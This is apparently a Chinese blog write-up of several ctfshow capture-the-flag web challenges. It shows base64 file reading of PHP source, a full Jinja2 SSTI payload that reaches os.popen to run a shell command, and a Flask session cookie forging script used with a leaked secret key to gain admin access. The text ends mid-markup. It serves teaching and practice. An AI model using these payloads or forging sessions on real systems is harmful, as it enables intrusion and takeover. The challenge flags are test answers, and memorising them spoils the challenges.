        <content type="html"><![CDATA[<h1 id="愚人杯"><a href="#愚人杯" class="headerlink" title="愚人杯"></a>愚人杯</h1><h1 id="热身赛："><a href="#热身赛：" class="headerlink" title="热身赛："></a>热身赛：</h1><p>有点坑，刚开始时脑子真没反应过来</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>flag就是“一个不能说的密码”，绝了，我还以为flag是“群主喜欢36d”（bushi）</p><h1 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a><strong>easy_signin</strong></h1><p>题目：</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled1.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>可以看到url里有一个img&#x3D;xxx</p><p>xxx为十六编码</p><p>我们试一下用index.php转换为base64：<code>aW5kZXgucGhw</code></p><p>包含<code>aW5kZXgucGhw</code></p><p>得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezBmZTk1YjRhLTU2NjEtNDU0OS04NzMxLTA1OTk0NzYyYmJhYX0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK</span><br></pre></td></tr></table></figure><p>进行base64解码得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2023-03-28 12:15:33</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line">- /</span><br><span class="line">$image=$_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">$flag = <span class="string">&quot;ctfshow&#123;0fe95b4a-5661-4549-8731-05994762bbaa&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($image))&#123;</span><br><span class="line">$image = base64_decode($image);</span><br><span class="line">$data = base64_encode(file_get_contents($image));</span><br><span class="line">echo <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,$data&#x27;/&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$image = base64_encode(<span class="string">&quot;face.png&quot;</span>);</span><br><span class="line">header(<span class="string">&quot;location:/?img=&quot;</span>.$image);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><h1 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a><strong>easy_ssti</strong></h1><p>题目：页面提示有个app.py包，我们下载来看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hellodear</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;f&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br></pre></td></tr></table></figure><p>是道SSTI注入，我们需要访问<code>/hello.html</code>，拼接：<code>/hello.html/&#123;&#123;payload&#125;&#125;</code>进行注入</p><p>先试一下2，没问题，页面返回2，证明代码成功运行了</p><p>思路：</p><p>利用<code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[83]</code>构造出我们想要的类</p><p><code>&quot;&quot;.__class__</code>：当前变量的类</p><p><code>&quot;&quot;.__class__.___bases__[0]</code>：当前变量的类的基类（最基础的类，[0]表示object类）</p><p><code>&quot;&quot;.__class__.__bases__[0].__subclasses__()[83]</code> 当前变量的类的基类的子类（到这里已经包含了其他类，83表示数组中的索引，指向一个类，83是通过爆破出来的，一边爆破一边看包返回长度及内容）</p><p>然后<code>__init__</code>表示将类初始化（有点像实例化，不确定）</p><p><code>__globals__</code> 取function所处空间下可使用的module、方法以及所有变量</p><p><code>__globals__[&#39;__builtins__&#39;]</code> 表示类里面的函数了（这里可以输出看一下有什么函数，如果没有我们要的可以更改<code>__subclasses__[]</code>看一下有没有我们想要的）</p><p><code>__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]()</code> 调用eval函数</p><p>传参<code>(&quot;__import__(&#39;os&#39;).popen(&#39;echo Y2F0IC9mbGFn |base64 -d|sh&#39;).read()&quot;)</code></p><p>这里已经是执行python代码了，我们动态导入os库，然后调用popen执行，用read()读取</p><p>这里出现了个问题，就是传入参数中屏蔽了斜杆“<code>/</code>”，所以我们需要使用base64编码绕过</p><p>但又出来个问题，我以前用的是<code>bash</code>，但这里发现不行，所以根据经验改为<code>sh</code></p><p>最后得到payload:</p><p><code>http://af57955d-b019-4224-9356-8e996bc58900.challenge.ctf.show/hello/&#123;&#123;"".__class__.__bases__[0].__subclasses__()[83].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('echo Y2F0IC9mbGFn |base64 -d|sh').read()")&#125;&#125;</code></p><p>成功！！！</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled2.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a><strong>easy_flask</strong></h1><p>知识点：</p><ul><li>flask session伪造</li><li>flask代码审计</li><li>任意文件下载</li></ul><p>题目：</p><p>进来之后有两个窗口，一个登录窗口和一个注册窗口</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled3.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>在注册窗口尝试注册了admin，发现用户已存在</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled4.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>然后在这里在登录和注册试了sql注入，没成功</p><p>我们先随便注册一个账号，登录进去</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled5.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>发现有个<code>leran</code> 点击（我刚开始没点击，在登录和注册徘徊了1个多小时（悲））</p><ul><li><p>得到部分源代码</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure></li></ul><p>对代码进行审计，看来我们需要进行flask session伪造</p><ul><li><p>flask session伪造脚本：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br><span class="line">__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><span class="line"></span><br><span class="line"># standard imports</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"></span><br><span class="line"># Abstract Base Classes (PEP 3119)</span><br><span class="line">if sys.version_info[0] &lt; 3:  # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line">elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line">else:  # &gt; 3.4</span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"># Lib for argument parsing</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"># external Imports</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line">if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                if (secret_key == None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">else:  # &gt; 3.4</span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">try:</span><br><span class="line">                if (secret_key == None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # Args are only relevant for __main__ usage</span><br><span class="line"></span><br><span class="line">    ## Description for help</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,</span><br><span class="line">        epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)</span><br><span class="line"></span><br><span class="line">    ## prepare sub commands</span><br><span class="line">    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)</span><br><span class="line"></span><br><span class="line">    ## create the parser for the encode command</span><br><span class="line">    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)</span><br><span class="line">    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Secret key&#x27;, required=True)</span><br><span class="line">    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Session cookie structure&#x27;, required=True)</span><br><span class="line"></span><br><span class="line">    ## create the parser for the decode command</span><br><span class="line">    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)</span><br><span class="line">    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Secret key&#x27;, required=False)</span><br><span class="line">    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                               help=&#x27;Session cookie value&#x27;, required=True)</span><br><span class="line"></span><br><span class="line">    ## get args</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ## find the option chosen</span><br><span class="line">    if (args.subcommand == &#x27;encode&#x27;):</span><br><span class="line">        if (args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    elif (args.subcommand == &#x27;decode&#x27;):</span><br><span class="line">        if (args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value, args.secret_key))</span><br><span class="line">        elif (args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br><span class="line"></span><br><span class="line"># &#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><p>我们在浏览器把session复制下来</p><p>利用脚本进行session解密和伪造：</p><p>（解密后推理管理员伪造的规律）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\CTFtools\其他\pytools&gt;[demo1.py](http://demo1.py/) decode -s <span class="string">&quot;S3cr3tK3y&quot;</span> -c <span class="string">&quot;eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImFkbWluMiJ9.ZCeNjw.SI08C_xd1I55TbZzcedhgi_oqcU&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;loggedin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin2&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\CTFtools\其他\pytools&gt;[demo1.py](http://demo1.py/) encode -s <span class="string">&quot;S3cr3tK3y&quot;</span> -t <span class="string">&quot;&#123;&#x27;loggedin&#x27;: True, &#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">.eJyrVsrJT09PTcnMU7IqKSpN1VEqys9JVbJSSkzJBYrpKJUWpxblJeYihGoBzOYRgA.ZCeVRA.p_DkccHDcwzHQA7CmXPqH-5OF3c</span><br></pre></td></tr></table></figure><p>将伪造后的session导入</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled6.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>成功登入</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled7.png" class="lazyload placeholder" data-srcset="/2023/06/27/yu-ren-bei-wp/Untitled7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>发现一个txt文件，下载到一个假的flag</p><p><img src="/2023/06/27/yu-ren-bei-wp/Untitled8.png" class="lazyload placeholder" 